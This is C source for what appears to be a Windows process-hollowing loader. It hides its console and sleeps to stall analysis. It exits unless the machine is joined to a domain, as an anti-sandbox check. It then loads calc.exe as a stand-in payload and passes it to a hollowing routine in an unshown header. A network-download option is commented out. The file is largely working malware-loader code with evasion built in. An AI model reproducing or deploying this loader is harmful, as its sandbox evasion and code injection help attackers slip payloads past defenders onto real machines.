#include <stdio.h>
#include <Windows.h>
#include <LM.h>

#include "utils.h"


#pragma comment(lib, "Netapi32.lib")


int _DomainJoinAntiVM() {
    LPWSTR _DomainName = NULL;
    PNETSETUP_JOIN_STATUS _pNetJoinStatus = { 0 };
    NetGetJoinInformation(NULL, &_DomainName, &_pNetJoinStatus);


    if (_DomainName != NULL)
        return TRUE;
    else
        return FALSE;
}

int main() {

    //Hide console
    FreeConsole();

    PPayload_Information _Info = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PAYLOAD_INFO_SIZE);
    Sleep(4675);
    //Evade potential sandbox
    if (!_DomainJoinAntiVM())
        return 0;

    //_GetDataFromInternet(_Info);
    WCHAR _Payload[] = L"C:\\Windows\\System32\\calc.exe";
    if (!_GetDataFromLocalFile(_Info, _Payload))
        return 0;

    printf("Start !\n");
    Hollow_Me(_Info);



}